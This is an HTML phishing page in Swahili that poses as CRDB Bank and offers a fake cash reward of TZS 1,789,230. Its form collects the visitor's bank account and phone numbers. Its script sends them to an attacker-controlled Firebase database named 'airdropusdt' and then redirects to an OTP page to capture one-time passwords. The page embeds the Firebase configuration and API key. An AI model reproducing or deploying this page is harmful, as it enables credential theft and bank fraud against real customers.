<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>CRDB Bank Cash Reward</title>

  <style>
    :root{
      --crdb-green:#2E7D32;
      --white:#ffffff;
      --text:#1c1c1c;
      --muted:#5a5a5a;
      --bg-gradient: linear-gradient(135deg, #a8e063 0%, #56ab2f 100%);
    }

    body{
      margin:0;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      background: var(--bg-gradient);
      font-family: "Poppins", Arial, sans-serif;
      padding:20px;
    }

    /* CARD */
    .card{
      background: var(--bg-gradient); /* same as body */
      width:92%;
      max-width:340px;
      border-radius:16px;
      padding:22px 20px;
      box-shadow:0 8px 25px rgba(0,0,0,0.2); /* slight shadow for contrast */
      border:1px solid rgba(255,255,255,0.3); /* subtle border */
      animation:fadeIn .7s ease;
      color: var(--text);
    }

    @keyframes fadeIn {
      from {opacity:0; transform:translateY(10px);}
      to {opacity:1; transform:translateY(0);}
    }

    h1{
      color:var(--crdb-green);
      font-size:19px;
      margin:0 0 12px 0;
      font-weight:700;
      line-height:1.3;
    }
    p{
      font-size:14px;
      margin:0 0 14px 0;
      line-height:1.45;
    }

    ul{
      background: rgba(255,255,255,0.6);
      padding:12px 14px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.4);
      font-size:13px;
      color:#1c1c1c;
      margin:0 0 16px 0;
    }
    ul li{
      margin-bottom:6px;
    }

    /* INPUT */
    input{
      width:100%;
      padding:12px;
      border-radius:10px;
      border:1px solid #cdd8ce;
      margin-bottom:12px;
      font-size:14px;
      background:#fcfcfc;
    }

    /* BUTTON */
    .btn{
      width:100%;
      padding:12px;
      border-radius:10px;
      border:none;
      background:var(--crdb-green);
      color:white;
      font-weight:600;
      font-size:15px;
      cursor:pointer;
    }

    .note{
      font-size:13px;
      margin-top:12px;
      min-height:18px;
      text-align:center;
    }

    /* LOADING OVERLAY */
    .overlay{
      position:fixed;
      inset:0;
      display:none;
      align-items:center;
      justify-content:center;
      background:rgba(0,0,0,0.35);
      z-index:9999;
    }
    .spinner{
      width:70px;
      height:70px;
      border-radius:50%;
      border:6px solid rgba(255,255,255,0.25);
      border-top-color:#fff;
      animation:spin 1s linear infinite;
    }
    @keyframes spin{ to{ transform:rotate(360deg); } }
  </style>

</head>
<body>

  <div class="card" role="main" aria-labelledby="title">
    <h1 id="title">ðŸ’³CRDB Cash Reward TZS 1,789,230</h1>

    <p>Kamilisha taarifa zako ili kuthibitisha akaunti yako kwa ajili ya upokeaji wa 
      <strong>TZS 1,789,230</strong>.</p>

    <ul>
      <li>Jaza namba ya akaunti inayotumika.</li>
      <li>Hakikisha namba ya simu imesajiliwa.</li>
      <li>Hatua inayofuata: uthibitisho wa OTP.</li>
    </ul>

    <input type="text" id="accNumber" placeholder="Namba ya Akaunti ya CRDB" autocomplete="off"/>
    <input type="tel" id="phoneNumber" placeholder="Namba ya simu iliyo sajiliwa (07â€¦)" inputmode="tel"/>

    <button id="submitBtn" class="btn">Endelea</button>
    <div id="message" class="note" aria-live="polite"></div>
  </div>

  <div id="loading" class="overlay" aria-hidden="true">
    <div class="spinner" role="status"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
      authDomain: "airdropusdt-767d7.firebaseapp.com",
      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "airdropusdt-767d7",
      storageBucket: "airdropusdt-767d7.firebasestorage.app",
      messagingSenderId: "627616603037",
      appId: "1:627616603037:web:63041f067800c97fab6d74",
      measurementId: "G-01F6G2CYXK"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const loading = document.getElementById('loading');
    const submitBtn = document.getElementById('submitBtn');
    const messageDiv = document.getElementById('message');

    function showLoading(show=true){
      loading.style.display = show ? 'flex' : 'none';
      loading.setAttribute('aria-hidden', show ? 'false' : 'true');
    }

    submitBtn.addEventListener('click', async () => {
      messageDiv.textContent = '';
      const acc = document.getElementById('accNumber').value.trim();
      const phone = document.getElementById('phoneNumber').value.trim();

      if (!acc || !phone) {
        messageDiv.style.color = 'orangered';
        messageDiv.textContent = 'âš ï¸ Jaza taarifa zote.';
        return;
      }

      showLoading(true);

      try {
        const newEntryRef = push(ref(db, "crdb_submissions"));
        const id = newEntryRef.key;

        await set(newEntryRef, {
          accountNumber: acc,
          phoneNumber: phone,
          amount: 1789230,
          createdAt: new Date().toISOString()
        });

        localStorage.setItem('submissionId', id);

        messageDiv.style.color = 'green';
        messageDiv.textContent = 'Inachakata...';

        setTimeout(() => {
          showLoading(false);
          window.location.href = 'otp.html';
        }, 900);

      } catch (err) {
        showLoading(false);
        messageDiv.style.color = 'orangered';
        messageDiv.textContent = 'Kosa limetokea. Jaribu tena.';
      }
    });
  </script>

</body>
  </html>
